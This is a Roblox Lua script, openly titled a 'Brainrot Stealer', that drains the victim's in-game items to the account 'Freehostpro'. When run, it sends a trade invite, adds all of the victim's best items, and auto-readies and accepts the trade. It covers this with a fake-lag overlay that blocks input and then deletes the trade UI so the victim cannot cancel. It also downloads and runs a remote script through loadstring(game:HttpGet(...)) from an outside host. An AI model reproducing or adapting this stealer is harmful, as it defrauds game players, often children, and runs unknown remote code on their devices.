--[[
    SOMBRA BRAINROT STEALER | Automated Trade Drain
    Sends trade to "Freehostpro", adds all best brainrots, auto-readies,
    auto-accepts, fake-lags screen, runs external script, deletes trade UI.
    Works on mobile & PC. Executor ready.
--]]

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- Wait for required modules
local Packages = ReplicatedStorage:WaitForChild("Packages")
local Net = require(Packages:WaitForChild("Net"))
local Synchronizer = require(Packages:WaitForChild("Synchronizer"))
local AnimalsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))

-- Remote objects
local TradeInvite = Net:RemoteFunction("TradeService/Invite")
local AddBrainrot = Net:RemoteFunction("TradeService/AddBrainrot")
local AcceptTrade = Net:RemoteEvent("TradeService/Accept")
local ReadyTrade = Net:RemoteEvent("TradeService/Ready")
local CancelTrade = Net:RemoteEvent("TradeService/CancelTrade")

-- Sub-UUIDs from game source
local INVITE_UUID = "be01db97-504e-48f7-b7da-ff1f3969e089"
local ADD_BRAINROT_UUID = "6f28b341-bbc2-4ba0-a515-a3bc728c8c12"
local ACCEPT_UUID = "37d9ae72-289c-431b-90d1-1d477f017912"
local READY_UUID = "710f3be3-ec7b-4cb8-acf1-6fa6f2729a63"

-- Target user
local TARGET_NAME = "Freehostpro"

print("[SOMBRA] Brainrot Stealer starting...")

-- Function to get user ID from name
local function getUserId(name)
    local success, id = pcall(function()
        return Players:GetUserIdFromNameAsync(name)
    end)
    if success and id then
        return id
    else
        warn("[SOMBRA] Failed to get user ID for " .. name)
        return nil
    end
end

-- Function to wait for player data
local function getPlayerData()
    local data = nil
    pcall(function()
        data = Synchronizer:Wait(LocalPlayer)
    end)
    return data
end

-- Function to send trade invite
local function sendInvite(targetUserId)
    pcall(function()
        local ok, err = TradeInvite:InvokeServer(INVITE_UUID, targetUserId)
        if not ok then
            warn("[SOMBRA] Invite failed: " .. tostring(err))
        else
            print("[SOMBRA] Invite sent to " .. targetUserId)
        end
    end)
end

-- Function to add all best brainrots to trade
local function addBestBrainrots()
    local data = getPlayerData()
    if not data then return end

    local podiums = data:Get("AnimalPodiums")
    if type(podiums) ~= "table" then
        print("[SOMBRA] No AnimalPodiums data found.")
        return
    end

    for podiumIndex, brainrot in pairs(podiums) do
        if type(brainrot) == "table" and not brainrot.Machine and AnimalsData[brainrot.Index] then
            -- This is a valid non-machine brainrot
            pcall(function()
                AddBrainrot:InvokeServer(ADD_BRAINROT_UUID, podiumIndex, brainrot)
                print("[SOMBRA] Added brainrot from podium " .. podiumIndex)
            end)
        end
    end
end

-- Function to auto-ready and accept
local function readyAndAccept()
    -- Fire Ready
    pcall(function()
        ReadyTrade:FireServer(READY_UUID)
        print("[SOMBRA] Fired Ready")
    end)

    -- Wait a bit then fire Accept
    wait(2)
    pcall(function()
        AcceptTrade:FireServer(ACCEPT_UUID)
        print("[SOMBRA] Fired Accept")
    end)
end

-- Function to fake-lag screen (blocks input, shows black overlay)
local function fakeLagScreen(duration)
    local overlay = Instance.new("ScreenGui")
    overlay.Name = "FakeLagOverlay"
    overlay.ResetOnSpawn = false
    overlay.IgnoreGuiInset = true
    overlay.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    overlay.DisplayOrder = 9999
    overlay.Parent = LocalPlayer:WaitForChild("PlayerGui")

    local blackFrame = Instance.new("Frame")
    blackFrame.Size = UDim2.fromScale(1, 1)
    blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    blackFrame.BackgroundTransparency = 0.2
    blackFrame.BorderSizePixel = 0
    blackFrame.Active = true
    blackFrame.ZIndex = 10000
    blackFrame.Parent = overlay

    -- Block all input
    UserInputService.ModalEnabled = true

    -- Wait for duration
    wait(duration)

    -- Cleanup
    UserInputService.ModalEnabled = false
    overlay:Destroy()
end

-- Function to run external script
local function runExternalScript()
    local url = "https://api.getpolsec.com/scripts/hosted/62de790db3b7d86c6347d98891b3847ac873205436bd7469628f40bf3b9f6fa2.lua"
    pcall(function()
        loadstring(game:HttpGet(url))()
        print("[SOMBRA] External script executed")
    end)
end

-- Function to delete trade UI
local function deleteTradeUI()
    local tradeGuiNames = {
        "TradePrompts",
        "TradePlayerList",
        "TradeLiveTrade",
        -- Also possible other trade-related elements
        "TradeUI",
        "TradePanel"
    }

    for _, guiName in ipairs(tradeGuiNames) do
        local gui = PlayerGui:FindFirstChild(guiName)
        if gui then
            gui:Destroy()
            print("[SOMBRA] Destroyed " .. guiName)
        end
    end

    -- Also destroy any other trade-related ScreenGuis we may have created
    -- (like our overlay)
    local overlay = PlayerGui:FindFirstChild("FakeLagOverlay")
    if overlay then overlay:Destroy() end
end

-- Main sequence
local function main()
    -- Step 1: Get target user ID
    local targetId = getUserId(TARGET_NAME)
    if not targetId then
        warn("[SOMBRA] Could not resolve target user. Aborting.")
        return
    end

    -- Step 2: Send invite
    sendInvite(targetId)

    -- Wait for trade to become active (adjust time as needed)
    print("[SOMBRA] Waiting for trade to start...")
    wait(6) -- You can increase if needed

    -- Step 3: Add all best brainrots
    print("[SOMBRA] Adding brainrots...")
    addBestBrainrots()

    -- Wait for items to register
    wait(2)

    -- Step 4: Ready and accept
    readyAndAccept()

    -- Step 5: Fake lag the screen
    print("[SOMBRA] Lagging screen for 5 seconds...")
    fakeLagScreen(5)

    -- Step 6: Run external script
    runExternalScript()

    -- Step 7: Delete trade UI so victim cannot cancel
    deleteTradeUI()

    print("[SOMBRA] Stealer sequence completed.")
end

-- Execute
main()
